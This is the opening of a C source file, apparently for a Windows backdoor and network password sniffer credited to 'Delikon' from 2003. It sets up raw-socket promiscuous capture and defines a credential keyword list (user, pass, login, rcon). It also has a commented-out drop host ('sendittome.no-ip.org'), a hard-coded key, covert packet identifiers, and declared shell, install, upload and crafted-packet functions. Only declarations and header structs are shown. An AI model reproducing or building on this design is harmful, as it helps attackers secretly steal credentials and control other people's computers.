/*
dieser quellcode darf nicht veröffentlicht oder in irgendeiner Form verbreitet oder verändert werden
Delikon 14.2.03*/

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
//#include "rijndael.h"
#pragma  comment(lib,"ws2_32")



#define _WIN32_WINNT 0x0500
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#define MAX_ADDR_LEN 16
#define MAX_HOSTNAME_LAN 255
//#define tcpbegin 38
//#define udpbegin 32
//#define host "sendittome.no-ip.org"
//#define sou "192.168.0.12"
//#define encKey "123456789A123456789B123456789C1"
#define id "r00T"
#define fileId "urtz"
#define commandId "c0mm"
#define fileDataSize 910
#define commandDataSize 80
#define RECV_BUF 1024
#define signals "|user |pass|Pass|User |rcon|login|USER |PASS|"
//debug
void file (unsigned  char i[]);

void shell ();
//int check_data(int datalen, char *data, int begin);
int check_data1(int datalen, char *data, int begin, char *search);
int check_data2(int datalen, char *data, int begin, char *search);
void install (char s[],char d[]);
void en (char in[],unsigned   char  output[],int len,unsigned char key[]);
void RecvPacket();

int senddata(char ident[],unsigned   char  output[], char  dest[], char  sour[],int dport);
USHORT checksum(USHORT *buffer, int size);
void upload(char buffer[]);
void de (char in[],unsigned   char  output[],int len,unsigned char key[]);
void paste (char in[],char po[], char pa[] ,char  data[]);





typedef struct _iphdr
{
unsigned char h_lenver;
unsigned char tos;
unsigned short total_len;
unsigned short ident;
unsigned short frag_and_flags;
unsigned char ttl;
unsigned char proto;
unsigned short checksum;
unsigned int sourceIP;
unsigned int destIP;
}IP_HDR;

typedef struct tcpheader2 {
     unsigned short int sport;
     unsigned short int dport;
     unsigned int th_seq;
     unsigned int th_ack;
     unsigned char th_x2:4;
     unsigned char th_off:4;
     unsigned char Flags;
     unsigned short int th_win;
     unsigned short int th_sum;
     unsigned short int th_urp;

	 unsigned  char identity [4];
	 unsigned  char file [fileDataSize+16];
	 unsigned  char command [commandDataSize+16];


}TCP_HDR;

struct tcpheader {
 unsigned short int th_sport;
 unsigned short int th_dport;
 unsigned int th_seq;
 unsigned int th_ack;
 unsigned char th_x2:4, th_off:4;
 unsigned char th_flags;
 unsigned short int th_win;
 unsigned short int th_sum;
 unsigned short int th_urp;

 unsigned  char identity [4];
 unsigned  char data [200];
}; /* total tcp header length: 20 bytes (=160 bits) */


struct ipheader {
 unsigned char ip_hl:4, ip_v:4; /* this means that each member is 4 bits */
 unsigned char ip_tos;
 unsigned short int ip_len;
 unsigned short int ip_id;
 unsigned short int ip_off;
 unsigned char ip_ttl;
 unsigned char ip_p;
 unsigned short int ip_sum;
 unsigned int ip_src;
 unsigned int ip_dst;
}; /* total ip header length: 20 bytes (=160 bits) */

// Psuedo Header

typedef struct ps_hdr
{
    unsigned int   source_address;   // Source Address		 =>	  4 Bytes
    unsigned int   dest_address;     // Destination Address	 =>	  4 Bytes
    unsigned char  placeholder;	     // Place Holder		 =>	  1 Bytes
    unsigned char  protocol;	     // Protocol		 =>	  1 Bytes
    unsigned short tcp_length;	     // TCP Length		 =>    +  2 Bytes
				     //				       = 12 Bytes
    struct tcpheader tcp;

}PS_HDR;

typedef struct udphdr {
unsigned short sport;
unsigned short dport;
unsigned short len;
unsigned short cksum;
}UDP_HDR;



